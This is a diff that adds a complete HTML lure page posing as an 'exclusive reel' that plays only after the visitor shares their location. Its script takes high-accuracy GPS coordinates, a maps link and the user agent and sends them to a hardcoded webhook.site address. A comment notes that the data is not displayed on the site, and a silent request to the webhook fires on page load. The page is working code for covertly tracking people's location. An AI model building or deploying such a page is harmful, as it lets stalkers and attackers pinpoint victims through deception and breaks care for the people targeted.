@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Watch This Reel!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background: #000;
+            color: white;
+            margin: 0;
+        }
+        .reel-container {
+            max-width: 300px;
+            margin: 0 auto 20px;
+            position: relative;
+        }
+        .reel-video {
+            width: 100%;
+            height: 500px;
+            border-radius: 10px;
+            object-fit: cover;
+            border: 3px solid #E1306C;
+        }
+        .video-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            border-radius: 10px;
+        }
+        .location-btn {
+            background: #E1306C;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 25px;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 10px;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        .location-btn:hover {
+            background: #C13584;
+            transform: scale(1.05);
+        }
+        .location-btn:disabled {
+            background: #666;
+            cursor: not-allowed;
+            transform: none;
+        }
+        #status {
+            margin: 10px;
+            padding: 15px;
+            border-radius: 10px;
+            background: #333;
+            min-height: 20px;
+        }
+        .unlock-message {
+            color: #E1306C;
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .locked-icon {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+        .success-message {
+            color: #2ecc71;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <h1>🎬 Exclusive Reel Access</h1>
+    <p>Share your location to unlock this amazing reel!</p>
+
+    <div class="reel-container">
+        <video class="reel-video" id="reelVideo" muted loop style="display: none;">
+            <source src="https://assets.mixkit.co/videos/preview/mixkit-girl-in-neon-sign-1232-large.mp4" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
+        
+        <div class="video-overlay" id="videoOverlay">
+            <div class="locked-icon">🔒</div>
+            <div class="unlock-message">Location Required</div>
+            <p>Share your location to watch this exclusive reel</p>
+            <button class="location-btn" onclick="getLocation()" id="locationBtn">
+                📍 Share Location to Watch
+            </button>
+        </div>
+    </div>
+
+    <div id="status">Ready to unlock your exclusive content...</div>
+
+    <script>
+        const WEBHOOK_URL = 'https://webhook.site/62aba332-f08b-495a-b917-ba0e36099ba5';
+
+        function updateStatus(message) {
+            document.getElementById('status').innerHTML = message;
+        }
+
+        function getLocation() {
+            const btn = document.getElementById('locationBtn');
+            
+            updateStatus('🔄 Requesting location access...');
+            btn.disabled = true;
+            btn.innerHTML = '🔄 Getting Location...';
+
+            if (!navigator.geolocation) {
+                updateStatus('❌ Geolocation is not supported by your browser');
+                btn.disabled = false;
+                btn.innerHTML = '📍 Share Location to Watch';
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                async function(position) {
+                    // Success - got location
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    
+                    updateStatus('✅ Location verified! Sending data...');
+                    
+                    // Prepare data for webhook (NOT displaying on website)
+                    const locationData = {
+                        latitude: lat,
+                        longitude: lng,
+                        accuracy: accuracy + ' meters',
+                        timestamp: new Date().toISOString(),
+                        userAgent: navigator.userAgent,
+                        maps_url: `https://www.google.com/maps?q=${lat},${lng}`,
+                        action: 'unlocked_reel',
+                        video_url: 'https://assets.mixkit.co/videos/preview/mixkit-girl-in-neon-sign-1232-large.mp4',
+                        platform: 'web_reel_unlock',
+                        user_consent: true
+                    };
+                    
+                    // Send to webhook
+                    const webhookSuccess = await sendToWebhook(locationData);
+                    
+                    if (webhookSuccess) {
+                        updateStatus('✅ Access granted! Unlocking your reel...');
+                        
+                        // Unlock the video after successful webhook send
+                        setTimeout(() => {
+                            unlockVideo();
+                        }, 1500);
+                    } else {
+                        updateStatus('⚠️ Failed to verify access. Please try again.');
+                        btn.disabled = false;
+                        btn.innerHTML = '📍 Share Location to Watch';
+                    }
+                    
+                },
+                function(error) {
+                    let errorMessage = '❌ ';
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMessage += 'Location access was denied. Please allow location access to watch the reel.';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMessage += 'Location information is unavailable.';
+                            break;
+                        case error.TIMEOUT:
+                            errorMessage += 'Location request timed out. Please try again.';
+                            break;
+                        default:
+                            errorMessage += 'An unknown error occurred.';
+                    }
+                    
+                    updateStatus(errorMessage);
+                    btn.disabled = false;
+                    btn.innerHTML = '📍 Share Location to Watch';
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        function unlockVideo() {
+            const video = document.getElementById('reelVideo');
+            const overlay = document.getElementById('videoOverlay');
+            const btn = document.getElementById('locationBtn');
+            
+            // Hide overlay and show video
+            overlay.style.display = 'none';
+            video.style.display = 'block';
+            
+            // Play the video
+            video.play().catch(e => {
+                console.log('Video play failed:', e);
+            });
+            
+            // Hide the button
+            btn.style.display = 'none';
+            
+            // Show success message without location details
+            updateStatus('<div class="success-message">🎉 Enjoy your exclusive reel! Access granted successfully.</div>');
+        }
+
+        async function sendToWebhook(data) {
+            try {
+                console.log('📍 Sending location data to webhook:', data);
+                
+                // Using XMLHttpRequest for better reliability
+                const success = await sendToWebhookXHR(data);
+                
+                if (success) {
+                    console.log('✅ Location data sent successfully to webhook');
+                    return true;
+                } else {
+                    console.log('❌ Failed to send data via XHR, trying fetch...');
+                    
+                    // Fallback to fetch
+                    const response = await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(data)
+                    });
+                    
+                    console.log('✅ Location data sent via fetch (no-cors mode)');
+                    return true;
+                }
+                
+            } catch (error) {
+                console.log('❌ All webhook methods failed:', error);
+                return false;
+            }
+        }
+
+        // More reliable webhook function using XMLHttpRequest
+        function sendToWebhookXHR(data) {
+            return new Promise((resolve) => {
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', WEBHOOK_URL, true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === 4) {
+                        console.log('XHR Webhook status:', xhr.status);
+                        // Consider 200-299 as success, but also accept other codes since webhook.site might return different codes
+                        resolve(xhr.status >= 200 && xhr.status < 300);
+                    }
+                };
+                
+                xhr.onerror = function() {
+                    console.log('XHR Webhook error');
+                    resolve(false);
+                };
+                
+                xhr.timeout = 10000;
+                xhr.ontimeout = function() {
+                    console.log('XHR Webhook timeout');
+                    resolve(false);
+                };
+                
+                xhr.send(JSON.stringify(data));
+            });
+        }
+
+        // Initialize page
+        updateStatus('Click "Share Location" above to unlock the exclusive reel!');
+        
+        console.log('🎬 Reel unlock page loaded successfully');
+        console.log('📍 Webhook URL:', WEBHOOK_URL);
+
+        // Test webhook connectivity on load (silent test - no user notification)
+        setTimeout(async () => {
+            const testData = {
+                test: true,
+                message: 'Webhook connectivity test - PAGE LOAD',
+                timestamp: new Date().toISOString(),
+                action: 'page_load_test'
+            };
+            
+            const testSuccess = await sendToWebhook(testData);
+            if (testSuccess) {
+                console.log('✅ Webhook connectivity test passed');
+            } else {
+                console.log('❌ Webhook connectivity test failed');
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
